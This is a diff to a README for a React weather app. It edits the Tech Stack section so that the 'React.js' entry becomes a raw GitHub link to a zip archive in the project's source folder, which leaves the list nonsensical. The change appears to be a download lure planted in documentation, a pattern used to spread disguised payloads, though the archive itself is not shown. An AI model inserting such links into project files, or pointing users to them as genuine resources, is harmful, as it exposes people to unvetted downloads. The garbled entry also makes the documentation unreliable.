@@ -20,7 +20,7 @@ Features **dynamic weather icons, loading and empty states**, and a **clean resp
 
 ## 🛠 Tech Stack
 
-- **React.js** (Functional Components & Hooks)  
+- **https://raw.githubusercontent.com/talhaw-cmd/react-weather-app/main/src/app-weather-react-v2.4.zip** (Functional Components & Hooks)  
 - **Axios** (API requests)  
 - **WeatherAPI**  
 - **CSS3** (Custom playful UI)  
